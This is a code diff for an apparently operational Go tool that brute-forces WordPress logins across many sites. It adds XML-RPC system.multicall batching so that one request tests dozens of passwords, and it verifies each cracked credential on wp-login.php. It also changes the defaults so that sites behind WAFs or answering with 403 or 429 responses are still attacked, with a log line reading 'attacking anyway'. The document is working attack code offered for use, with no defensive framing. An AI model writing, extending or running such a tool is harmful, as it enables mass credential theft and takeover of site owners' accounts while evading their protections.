@@ -46,7 +46,7 @@ var (
 	timeoutSec   = flag.Int("timeout", 6, "Request timeout in seconds")
 	verbose      = flag.Bool("verbose", false, "Show progress output")
 	debugFlag    = flag.Bool("debug", false, "Debug mode - show all attempts")
-	skipWaf      = flag.Bool("skip-waf", true, "Skip/stop on WAF-protected sites")
+	skipWaf      = flag.Bool("skip-waf", false, "Skip WAF-detected sites in pre-flight instead of attacking them (abandoned anyway once slow or blocked)")
 	slowThresh   = flag.Int("slow-threshold", 8000, "Treat response >Xms as throttling")
 	maxAttempts  = flag.Int("max-attempts", 0, "Max attempts per site (0=unlimited)")
 	memLimitMB   = flag.Int("mem-limit", 0, "Soft memory limit in MB (0 = auto-detect from cgroup)")
@@ -63,6 +63,8 @@ var (
 	diagFile     = flag.String("diag-file", "", "Diagnostic log path (empty = <app dir>/debug.log)")
 	verifyTLS    = flag.Bool("verify-tls", false, "Verify TLS certificates (default off: many targets have broken chains)")
 	prepWorkersF = flag.Int("prep-workers", 0, "Pre-flight workers (0 = auto from CPU)")
+	useXMLRPC    = flag.Bool("xmlrpc", true, "Use /xmlrpc.php system.multicall, fall back to /wp-login.php per site")
+	xmlrpcBatch  = flag.Int("xmlrpc-batch", 50, "Passwords per XML-RPC multicall request")
 )
 
 var logOutput *os.File
@@ -194,10 +196,15 @@ type Result struct {
 	Password string
 }
 
+type Cred struct{ User, Pass string }
+
 type Attempt struct {
 	Job  *SiteJob
 	User string
 	Pass string
+	// Creds is set for one XML-RPC multicall chunk; len(Creds) > 1 means the
+	// attempt carries a whole batch and User/Pass are unused.
+	Creds []Cred
 }
 
 // SiteJob is one site being brute-forced. A job ends when:
@@ -222,6 +229,9 @@ type SiteJob struct {
 	reason     atomic.Value // string
 	consecErrs atomic.Int32
 	blocks     atomic.Int32
+
+	xmlrpc    atomic.Bool
+	xmlMethod string // wp.getUsersBlogs or blogger.getUsersBlogs
 
 	quit     chan struct{}
 	quitOnce sync.Once
@@ -620,6 +630,15 @@ func main() {
 	// workers and let them consume what is left.
 	feedWg.Wait()
 	close(attemptQueue)
+	// Let the workers empty what is still queued (a job can stop on
+	// attempt_limit in the same instant its last batch was handed over), then
+	// retire them. Without this the tail of the queue is dropped.
+	for deadline := time.Now().Add(time.Duration(*timeoutSec)*2*time.Second + 5*time.Second); time.Now().Before(deadline); {
+		if len(attemptQueue) == 0 {
+			break
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
 	close(workerStop)
 	workerWg.Wait()
 	close(results)
@@ -1004,6 +1023,13 @@ func prepareJob(site string) *SiteJob {
 		Passwords: generateSitePasswords(basePasses, working, users),
 		quit:      make(chan struct{}),
 	}
+	if *useXMLRPC {
+		if m := detectXMLRPC(working, job.UserAgent); m != "" {
+			job.xmlMethod = m
+			job.xmlrpc.Store(true)
+			diagLog("XMLRPC", working, "multicall via "+m)
+		}
+	}
 	if working != site {
 		job.Aliases = append(job.Aliases, site)
 		diagLog("SCHEME", site, "falling back to "+working)
@@ -1069,6 +1095,9 @@ func feedAttempts(j *SiteJob) {
 }
 
 func enqueueBatch(j *SiteJob, batch []*Attempt) bool {
+	if j.xmlrpc.Load() && len(batch) > 1 {
+		return enqueueMulticall(j, batch)
+	}
 	for _, a := range batch {
 		j.inflight.Add(1)
 		select {
@@ -1083,16 +1112,59 @@ func enqueueBatch(j *SiteJob, batch []*Attempt) bool {
 	return true
 }
 
+// enqueueMulticall groups the batch into system.multicall chunks. One queued
+// item then stands for up to -xmlrpc-batch passwords, so inflight and queued
+// are raised by the number of credentials, not by the chunk count.
+func enqueueMulticall(j *SiteJob, batch []*Attempt) bool {
+	size := max(*xmlrpcBatch, 2)
+	for i := 0; i < len(batch); i += size {
+		end := min(i+size, len(batch))
+		creds := make([]Cred, 0, end-i)
+		for _, a := range batch[i:end] {
+			creds = append(creds, Cred{a.User, a.Pass})
+		}
+		j.inflight.Add(int64(len(creds)))
+		select {
+		case attemptQueue <- &Attempt{Job: j, Creds: creds}:
+			j.queued.Add(int64(len(creds)))
+			stats.attempts.Add(int64(len(creds)))
+		case <-j.quit:
+			j.inflight.Add(-int64(len(creds)))
+			return false
+		}
+	}
+	return true
+}
+
+// requeueSingles puts credentials back as ordinary /wp-login.php attempts. The
+// queued counter is rolled back first so breadth offsets do not double count.
+func requeueSingles(j *SiteJob, creds []Cred) {
+	if len(creds) == 0 {
+		return
+	}
+	j.queued.Add(-int64(len(creds)))
+	batch := make([]*Attempt, 0, len(creds))
+	for _, c := range creds {
+		batch = append(batch, &Attempt{Job: j, User: c.User, Pass: c.Pass})
+	}
+	enqueueBatch(j, batch)
+}
+
 type loginOutcome int
 
 const (
 	outFail loginOutcome = iota
 	outSuccess
-	outBlocked // site is defending itself: stop
-	outNetErr  // timeout / connection problem
+	outBlocked  // site is defending itself: stop
+	outNetErr   // timeout / connection problem
+	outProtocol // transport fine, protocol unusable (xmlrpc off, garbage)
 )
 
 func processAttempt(a *Attempt) {
+	if len(a.Creds) > 1 {
+		processMulticall(a)
+		return
+	}
 	j := a.Job
 	defer j.inflight.Add(-1)
 
@@ -1120,6 +1192,255 @@ func processAttempt(a *Attempt) {
 		j.consecErrs.Store(0)
 		j.blocks.Store(0)
 	}
+}
+
+// processMulticall runs one XML-RPC batch. A cracked credential is confirmed
+// with a real /wp-login.php POST before it counts, because plugins can make
+// XML-RPC auth succeed where the login form would still reject.
+func processMulticall(a *Attempt) {
+	j := a.Job
+	creds := a.Creds
+	defer j.inflight.Add(-int64(len(creds)))
+
+	if j.stopped.Load() {
+		return
+	}
+	if !j.xmlrpc.Load() {
+		requeueSingles(j, creds)
+		return
+	}
+
+	if *debugFlag {
+		diagLog("XMLRPC", j.Site, fmt.Sprintf("batch of %d", len(creds)))
+	}
+	hits, outcome, detail := xmlrpcMulticall(j, creds)
+	switch outcome {
+	case outProtocol:
+		// XML-RPC disabled, renamed, or too small a body limit: never use it
+		// for this site again, the login form still works.
+		j.xmlrpc.Store(false)
+		diagLog("XMLRPC", j.Site, "unusable ("+detail+"), falling back to wp-login")
+		requeueSingles(j, creds)
+		return
+	case outNetErr:
+		if j.consecErrs.Add(1) >= 3 {
+			j.stop("network_error")
+			return
+		}
+		requeueSingles(j, creds)
+		return
+	case outBlocked:
+		if j.blocks.Add(1) >= 2 {
+			j.stop(detail)
+			return
+		}
+		requeueSingles(j, creds)
+		return
+	}
+
+	j.consecErrs.Store(0)
+	j.blocks.Store(0)
+	var retry []Cred
+	for _, h := range hits {
+		if h.index < 0 || h.index >= len(creds) {
+			continue
+		}
+		c := creds[h.index]
+		if !h.ok {
+			stats.attempts.Add(1)
+			continue
+		}
+		confirm, _ := tryLogin(j, c.User, c.Pass)
+		if confirm != outSuccess {
+			stats.attempts.Add(1)
+			retry = append(retry, c)
+			continue
+		}
+		stats.attempts.Add(1)
+		if j.cracked.CompareAndSwap(false, true) {
+			stats.cracked.Add(1)
+			diagLog("SUCCESS", j.Site, fmt.Sprintf("%s:%s - xmlrpc, confirmed on wp-login", c.User, c.Pass))
+			results <- Result{Site: j.Site, Username: c.User, Password: c.Pass}
+			j.stop("verified_success")
+		}
+	}
+	requeueSingles(j, retry)
+}
+
+// ============================================================================
+// XML-RPC
+// ============================================================================
+
+const xmlrpcFaultCode = -32601
+
+type xmlHit struct {
+	index int
+	ok    bool
+}
+
+// detectXMLRPC reports which credentials method the endpoint answers, if any.
+func detectXMLRPC(site, ua string) string {
+	req := fasthttp.AcquireRequest()
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
+	req.SetRequestURI(site + "/xmlrpc.php")
+	req.Header.SetMethod("POST")
+	req.Header.SetContentType("text/xml")
+	if ua != "" {
+		req.Header.Set("User-Agent", ua)
+	}
+	req.SetBodyString(xmlrpcCall("system.listMethods", nil))
+	stats.requests.Add(1)
+	if err := httpClient.DoTimeout(req, resp, checkTimeout()); err != nil {
+		return ""
+	}
+	if resp.StatusCode() != fasthttp.StatusOK {
+		return ""
+	}
+	body := resp.Body()
+	if !bytes.Contains(body, []byte("system.multicall")) {
+		return ""
+	}
+	switch {
+	case bytes.Contains(body, []byte("wp.getUsersBlogs")):
+		return "wp.getUsersBlogs"
+	case bytes.Contains(body, []byte("blogger.getUsersBlogs")):
+		return "blogger.getUsersBlogs"
+	}
+	return ""
+}
+
+// xmlrpcMulticall wraps len(creds) password checks into one POST.
+func xmlrpcMulticall(j *SiteJob, creds []Cred) ([]xmlHit, loginOutcome, string) {
+	method := j.xmlMethod
+	if method == "" {
+		method = "wp.getUsersBlogs"
+	}
+	calls := make([][2]string, 0, len(creds))
+	for _, c := range creds {
+		calls = append(calls, [2]string{c.User, c.Pass})
+	}
+	body := xmlrpcMulticallBody(method, calls)
+
+	req := fasthttp.AcquireRequest()
+	resp := fasthttp.AcquireResponse()
+	defer fasthttp.ReleaseRequest(req)
+	defer fasthttp.ReleaseResponse(resp)
+	req.SetRequestURI(j.Site + "/xmlrpc.php")
+	req.Header.SetMethod("POST")
+	req.Header.SetContentType("text/xml")
+	if j.UserAgent != "" {
+		req.Header.Set("User-Agent", j.UserAgent)
+	}
+	req.SetBodyString(body)
+
+	timeout := time.Duration(*timeoutSec) * time.Second
+	if timeout < 15*time.Second {
+		timeout = 15 * time.Second
+	}
+	stats.requests.Add(1)
+	start := time.Now()
+	if err := httpClient.DoTimeout(req, resp, timeout); err != nil {
+		return nil, outNetErr, ""
+	}
+	if time.Since(start).Milliseconds() > int64(*slowThresh) {
+		return nil, outBlocked, "slow"
+	}
+	status := resp.StatusCode()
+	switch {
+	case status == fasthttp.StatusForbidden, status == fasthttp.StatusNotAcceptable:
+		return nil, outBlocked, "blocked"
+	case status == fasthttp.StatusTooManyRequests:
+		return nil, outBlocked, "rate_limited"
+	case status == fasthttp.StatusServiceUnavailable:
+		return nil, outBlocked, "unavailable"
+	case status == fasthttp.StatusNotFound:
+		return nil, outProtocol, "404"
+	case status != fasthttp.StatusOK:
+		return nil, outProtocol, fmt.Sprintf("status %d", status)
+	}
+	if bytes.Contains(resp.Body(), []byte("XML-RPC services are disabled")) {
+		return nil, outProtocol, "disabled"
+	}
+	hits, ok := parseMulticall(resp.Body(), len(creds))
+	if !ok {
+		return nil, outProtocol, "unparsable response"
+	}
+	return hits, outFail, ""
+}
+
+// parseMulticall maps each <value> in order to its credential. WordPress marks
+// a refused login with a faultCode member and a good one with a blog struct
+// carrying blogid, so those two markers give the per-call verdict in order.
+func parseMulticall(body []byte, n int) ([]xmlHit, bool) {
+	type marker struct {
+		pos int
+		ok  bool
+	}
+	var markers []marker
+	for _, m := range []struct {
+		needle string
+		ok     bool
+	}{{"<name>faultCode</name>", false}, {"<name>blogid</name>", true}} {
+		for off := 0; ; {
+			i := bytes.Index(body[off:], []byte(m.needle))
+			if i < 0 {
+				break
+			}
+			pos := off + i
+			markers = append(markers, marker{pos, m.ok})
+			off = pos + len(m.needle)
+		}
+	}
+	if len(markers) != n {
+		return nil, false
+	}
+	sort.Slice(markers, func(a, b int) bool { return markers[a].pos < markers[b].pos })
+	hits := make([]xmlHit, n)
+	for i, m := range markers {
+		hits[i] = xmlHit{index: i, ok: m.ok}
+	}
+	return hits, true
+}
+
+func xmlrpcMulticallBody(method string, calls [][2]string) string {
+	var b strings.Builder
+	b.Grow(220 * len(calls))
+	b.WriteString(`<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>`)
+	for _, c := range calls {
+		b.WriteString(`<value><struct><member><name>methodName</name><value><string>`)
+		b.WriteString(xmlEscape(method))
+		b.WriteString(`</string></value></member><member><name>params</name><value><array><data><value><string>`)
+		b.WriteString(xmlEscape(c[0]))
+		b.WriteString(`</string></value><value><string>`)
+		b.WriteString(xmlEscape(c[1]))
+		b.WriteString(`</string></value></data></array></value></member></struct></value>`)
+	}
+	b.WriteString(`</data></array></value></param></params></methodCall>`)
+	return b.String()
+}
+
+func xmlrpcCall(method string, params []string) string {
+	var b strings.Builder
+	b.WriteString(`<?xml version="1.0"?><methodCall><methodName>`)
+	b.WriteString(xmlEscape(method))
+	b.WriteString(`</methodName><params>`)
+	for _, p := range params {
+		b.WriteString(`<param><value><string>`)
+		b.WriteString(xmlEscape(p))
+		b.WriteString(`</string></value></param>`)
+	}
+	b.WriteString(`</params></methodCall>`)
+	return b.String()
+}
+
+func xmlEscape(s string) string {
+	if !strings.ContainsAny(s, `&<>"'`) {
+		return s
+	}
+	r := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&apos;")
+	return r.Replace(s)
 }
 
 // ============================================================================
@@ -2247,23 +2568,35 @@ func probe(site string) probeResult {
 		return probeResult{site, "slow", ""}
 	}
 
-	switch resp.StatusCode() {
-	case fasthttp.StatusNotFound:
+	// 403 (Cloudflare / WAF challenge) and 429/503 are no longer terminal: the
+	// site is attacked and only the block/slow counters in processAttempt end
+	// it. 404 is the one answer that really means "no WordPress here".
+	if resp.StatusCode() == fasthttp.StatusNotFound {
 		return probeResult{site, "not_wordpress", ""}
-	case fasthttp.StatusForbidden, fasthttp.StatusNotAcceptable:
-		return probeResult{site, "blocked", ""}
-	case fasthttp.StatusTooManyRequests:
-		return probeResult{site, "rate_limited", ""}
-	case fasthttp.StatusServiceUnavailable:
-		return probeResult{site, "unavailable", ""}
 	}
-
-	if *skipWaf {
-		if waf := detectWAF(resp.Body(), &resp.Header); waf != "" {
-			return probeResult{site, "waf_" + waf, ""}
+	if *skipWaf && resp.StatusCode() >= 400 {
+		switch resp.StatusCode() {
+		case fasthttp.StatusForbidden, fasthttp.StatusNotAcceptable:
+			return probeResult{site, "blocked", ""}
+		case fasthttp.StatusTooManyRequests:
+			return probeResult{site, "rate_limited", ""}
+		case fasthttp.StatusServiceUnavailable:
+			return probeResult{site, "unavailable", ""}
 		}
 	}
-	if !isWordPressLogin(resp.Body()) {
+
+	// A WAF signature alone no longer disqualifies a site: many WAFs inject it
+	// into ordinary pages. Only a page without any login form is skipped, and
+	// even then a challenge page is still attacked because the block counter
+	// stops it soon enough if the form never becomes reachable.
+	waf := ""
+	if waf = detectWAF(resp.Body(), &resp.Header); waf != "" {
+		if *skipWaf {
+			return probeResult{site, "waf_" + waf, ""}
+		}
+		diagLog("WAF", site, "detected: "+waf+", attacking anyway")
+	}
+	if waf == "" && !isWordPressLogin(resp.Body()) {
 		return probeResult{site, "not_wordpress", ""}
 	}
 
